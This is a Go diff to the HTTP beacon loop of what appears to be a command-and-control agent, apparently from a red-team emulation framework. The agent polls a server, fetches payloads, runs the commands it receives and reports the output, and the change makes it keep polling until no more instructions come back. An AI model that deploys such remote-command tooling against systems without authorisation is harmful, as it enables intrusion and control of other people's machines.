@@ -24,22 +24,24 @@ func (contact HTTP) Communicate(address string, sleep int, beacon Beacon) {
 	checkValidHTTPTarget(address, true)
 	for {
 		beacon.Links = beacon.Links[:0]
-
-		body := beaconPOST(address, beacon)
-		var tempB Beacon
-		json.Unmarshal(body, &tempB)
-
-		for _, link := range tempB.Links {
-			if len(link.Payload) > 0 {
-				requestPayload(link.Payload)
+		for {
+			body := beaconPOST(address, beacon)
+			var tempB Beacon
+			json.Unmarshal(body, &tempB)
+			if(len(tempB.Links)) == 0 {
+				break
 			}
-			response, status, pid := commands.RunCommand(link.Request, link.Executor)
-			link.Response = strings.TrimSpace(response)
-			link.Status = status
-			link.Pid = pid
-			beacon.Links = append(beacon.Links, link)
+			for _, link := range tempB.Links {
+				if len(link.Payload) > 0 {
+					requestPayload(link.Payload)
+				}
+				response, status, pid := commands.RunCommand(link.Request, link.Executor)
+				link.Response = strings.TrimSpace(response)
+				link.Status = status
+				link.Pid = pid
+				beacon.Links = append(beacon.Links, link)
+			}
 		}
-		beaconPOST(address, beacon)
 		jitterSleep(sleep, "HTTP")
 	}
 }
@@ -76,29 +78,24 @@ func beaconPOST(address string, beacon Beacon) []byte {
 
 func request(address string, method string, data []byte) ([]byte, http.Header, error) {
 	client := &http.Client{}
-
 	req, err := http.NewRequest(method, address, bytes.NewBuffer(data))
 	if err != nil {
 		log.Print(err)
 	}
-
 	resp, err := client.Do(req)
 	if err != nil {
 		log.Print(err)
 		return nil, nil, err
 	}
-
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
 		log.Print(err)
 		return nil, nil, err
 	}
-
 	err = resp.Body.Close()
 	if err != nil {
 		log.Print(err)
 		return nil, nil, err
 	}
-
 	return body, resp.Header, err
 }
